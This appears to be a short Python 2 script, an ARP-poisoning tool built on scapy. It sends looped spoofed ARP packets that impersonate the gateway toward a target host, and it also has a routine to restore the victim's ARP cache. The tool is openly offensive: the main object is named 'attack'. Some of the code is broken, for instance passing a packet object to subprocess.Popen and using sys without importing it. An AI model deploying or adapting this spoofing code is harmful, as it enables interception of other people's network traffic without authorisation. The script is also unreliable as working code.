import subprocess
import os
import re
import netifaces as ni
from urllib2 import urlopen
from scapy.all import Dot11,Dot11Beacon,Dot11Elt,sendp,hexdump,Ether,ARP
import time

class Session:      # preparing for implementation of wireless fun & games too
    def __init__(self, ip, mac, pub_ip, gateway, iface = "eth0"):
        self.iface = iface
        self.ip = ip
        self.mac = mac
        self.pub_ip = pub_ip
        self.gateway = gateway
        self.arp_poison_pid = 0
        pid = subprocess.Popen(["arp", "-n", self.gateway], stdout=subprocess.PIPE)
        s = pid.communicate()[0]
        #self.router_mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]  #this is for OSX -> development
        self.router_mac = re.search(r"([a-fA-F0-9]{2}[:|\-]?){6}", s).groups()[0]

    def arp_poison(self, target):
        pkt = Ether()/ARP(op="who-has",hwsrc=self.mac,psrc=self.gateway,pdst=target)
        try:
            proc = subprocess.Popen(["sendp(", pkt,", iface=", self.iface, ", inter=0.100, loop=1)"], stdout=open(os.devnull, 'w'))
        except:
            print "A major fuckup, can't spam my favorite ARP requests.."
        self.arp_poison_pid = proc.pid
        return 0
    def restore_arp_cache(self, target):
        pkt = Ether()/ARP(op="who-has",hwsrc=self.router_mac,psrc=self.gateway,pdst=target)
        try:
            os.kill(self.arp_poison_pid)
        except:
            print "Not running :/.."
        for i in range(51):
            try:
                sendp(pkt, iface= self.iface)
                time.sleep(0.05)
            except:
                break
        return 0



def get_ip(iface = 'eth0'):
    ip = ni.ifaddresses(iface)[ni.AF_INET][0]['addr']
    return ip

def get_mac(iface = 'eth0'):
    mac = ni.ifaddresses(iface)[ni.AF_LINK][0]['addr']
    return mac

def get_pub_ip():
    return urlopen('http://ip.42.pl/raw').read()

def get_default_gateway():
    return ni.gateways()['default'][ni.AF_INET][0]

if __name__ == '__main__':
    try:
        attack = Session(get_ip(), get_mac(), get_pub_ip(), get_default_gateway())
    except KeyError:
        print "Not connected to any network.."
        sys.exit(-1)
